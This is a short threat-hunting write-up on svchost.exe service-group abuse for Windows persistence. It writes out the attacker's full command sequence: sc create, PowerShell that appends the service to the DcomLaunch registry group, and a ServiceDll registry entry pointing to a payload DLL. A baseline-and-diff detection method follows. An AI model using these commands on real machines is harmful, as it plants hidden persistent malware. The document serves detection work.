one of the Persistence tichnique is using SVCHOST injection or abusing to Upload malicouse Service on a Service Group via SVCHOST.exe like this sample :

```
## Hunting in SVCHOST.exe -- Reading about SVCHOST.exe
svchost.exe -k DcomLaunch ## about ServiceGroup HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost and in DcomLaunch is about service group, DcomLuanch is an Example there are another serviceGroup like netsvc
svchost.exe -k -s ## this switch "-s" is direct point to the service there is in DcomLaunch (serviceGroup)


## The attacker Create Service under the SVCHOST.exe, this process has alot false positive logs

-- example the attack signature: 
sc create Test1 binpath="c:\windows\system32\svchost.exe -k Dcomlaunch" start=auto type=share    ### The Attacker add his mal_DLL on DcomLuanch Service Group for his aim  ## Create a service named "Test1"
$svc = Get-Item 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost\'  ### Get the path of the svchost 
$value = $svc.GetValue("DcomLaunch")  ### get the whole services there are in the DcomLaunch Service Group and pull them into the $value
$value  ### until this step the whole of the DcomLaunch Service Group will be showing
$value += "Test1"  ## add this Services into the $value
$value
set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost\" "DcomLaunch" $value   ## by this command add Test1 Service into the DcomLaunch
reg add "HKLM\system\currentcontrolset\services\Test1\parameters" /v servicedll /t REG_EXPAND_SZ /d "c:\programedata\dll1.dll" /f   ###HKLM\SYSTEM\CurrentControlSet\Services\Test1 in this sample /v named for type of service /t means type of value /d refferer to our payload
```

If you have CTI Role Base for Hunting this abnormal Behavior on the SVCHOST.exe you must using Powershell script as Base line using these methods:
1. Run "svchost_injection_detect.ps1" on the Clean Install System and take an output for further compare.
2. Run "svchost_injection_detect.ps1" on victim
3. diff between Clean and malincous outputs

In Brifly :
1. Create a service
2. add our services into the ServiceGroup like DcomLunch
3. add our payload into the DcomLunch Service Group name dll1.dll
4. if the victime login to his client our paylaod would be run
